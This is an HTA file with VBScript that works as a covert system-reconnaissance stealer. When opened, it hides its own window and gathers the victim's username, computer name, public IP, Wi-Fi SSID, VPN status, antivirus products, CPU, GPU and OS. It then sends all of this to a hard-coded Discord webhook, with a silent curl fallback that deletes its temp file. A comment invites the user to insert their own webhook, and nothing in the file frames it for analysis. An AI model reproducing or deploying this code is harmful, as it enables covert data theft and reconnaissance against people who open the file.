<!DOCTYPE html>
<html>
<head>
    <hta:application id="oHTA" border="none" caption="no" showintaskbar="no" windowstate="minimize" />
    <title></title>
</head>
<body>
    <script language="VBScript">
        Option Explicit
        
        ' === REPLACE THIS WITH YOUR WEBHOOK ===
        Const WEBHOOK = "https://discord.com/api/webhooks/1502379311577956374/Qkt2VOYWbwoBc85FzPUvQ0fHDn0qxPyqxu3kbComwCORP1rdu-D3xJjL9dE41X1okoPK"
        
        Sub Window_OnLoad
            On Error Resume Next
            window.resizeTo 0,0
            window.moveTo -10000,-10000
            
            Dim payload: payload = CollectData()
            
            If Not SendData(payload) Then
                SendDataCurl payload
            End If
            
            window.close()
        End Sub
        
        Function CollectData()
            Dim cpu, gpu, ssid, vpn, av, ip, host, user, os
            
            ' CPU
            On Error Resume Next
            Dim wmi, items
            Set wmi = GetObject("winmgmts:\\.\root\cimv2")
            Set items = wmi.ExecQuery("SELECT Name FROM Win32_Processor")
            For Each item In items: cpu = Trim(item.Name): Exit For: Next
            
            ' GPU
            Set items = wmi.ExecQuery("SELECT Name FROM Win32_VideoController")
            For Each item In items: gpu = gpu & item.Name & " | ": Next
            If Len(gpu) > 150 Then gpu = Left(gpu, 150)
            
            ' Network (SSID + VPN)
            Dim sh, ex, ln
            Set sh = CreateObject("WScript.Shell")
            Set ex = sh.Exec("netsh wlan show interfaces")
            Do While Not ex.StdOut.AtEndOfStream
                ln = ex.StdOut.ReadLine()
                If InStr(ln, "SSID") > 0 And InStr(ln, "BSSID") = 0 Then
                    ssid = Trim(Mid(ln, InStr(ln, ":") + 1))
                End If
            Loop
            
            Set items = wmi.ExecQuery("SELECT * FROM Win32_NetworkAdapter WHERE NetConnectionStatus = 2")
            For Each item In items
                If InStr(LCase(item.Name), "vpn") > 0 OR InStr(LCase(item.Name), "virtual") > 0 Then
                    vpn = "true"
                End If
            Next
            If vpn = "" Then vpn = "false"
            
            ' AV
            On Error Resume Next
            Set wmi = GetObject("winmgmts:\\.\root\SecurityCenter2")
            Set items = wmi.ExecQuery("SELECT * FROM AntiVirusProduct")
            For Each item In items: av = av & item.displayName & " | ": Next
            If av = "" Then av = "Windows Defender/None"
            If Len(av) > 100 Then av = Left(av, 100)
            
            ' IP
            Dim http
            Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
            http.Open "GET", "https://api.ipify.org", False
            http.Send
            If http.Status = 200 Then ip = Trim(http.ResponseText)
            
            ' System
            host = CreateObject("WScript.Network").ComputerName
            user = CreateObject("WScript.Network").UserName
            Set items = GetObject("winmgmts:\\.\root\cimv2").ExecQuery("SELECT Caption FROM Win32_OperatingSystem")
            For Each item In items: os = item.Caption: Exit For: Next
            
            ' Build JSON
            Dim j
            j = "{""embeds"":[{"
            j = j & """title"":""" & Esc(host) & ""","
            j = j & """description"":""User: " & Esc(user) & ""","
            j = j & """color"":3447003,"
            j = j & """fields"":["
            j = j & "{""name"":""IP"",""value"":""" & Esc(ip) & """,""inline"":true},"
            j = j & "{""name"":""CPU"",""value"":""" & Esc(cpu) & """,""inline"":false},"
            j = j & "{""name"":""GPU"",""value"":""" & Esc(gpu) & """,""inline"":false},"
            j = j & "{""name"":""SSID"",""value"":""" & Esc(ssid) & """,""inline"":true},"
            j = j & "{""name"":""VPN"",""value"":""" & Esc(vpn) & """,""inline"":true},"
            j = j & "{""name"":""AV"",""value"":""" & Esc(av) & """,""inline"":false},"
            j = j & "{""name"":""OS"",""value"":""" & Esc(os) & """,""inline"":false}"
            j = j & "],""footer"":{""text"":""" & Now & """}}]}"
            
            CollectData = j
        End Function
        
        Function Esc(s)
            Esc = Replace(Replace(Replace(CStr(s), "\", "\\"), """", "\"""), vbLf, "\n")
        End Function
        
        Function SendData(json)
            On Error Resume Next
            Dim h
            Set h = CreateObject("WinHttp.WinHttpRequest.5.1")
            h.Open "POST", WEBHOOK, False
            h.setRequestHeader "Content-Type", "application/json"
            h.Send json
            SendData = (h.Status = 204)
        End Function
        
        Sub SendDataCurl(json)
            On Error Resume Next
            Dim fso, f, tmp, sh
            Set fso = CreateObject("Scripting.FileSystemObject")
            tmp = fso.GetSpecialFolder(2) & "\p.json"
            Set f = fso.CreateTextFile(tmp, True)
            f.Write json
            f.Close
            Set sh = CreateObject("WScript.Shell")
            sh.Run "curl.exe -X POST " & WEBHOOK & " -H ""Content-Type: application/json"" -d @" & tmp & " -s", 0, True
            fso.DeleteFile tmp, True
        End Sub
    </script>
</body>
</html>
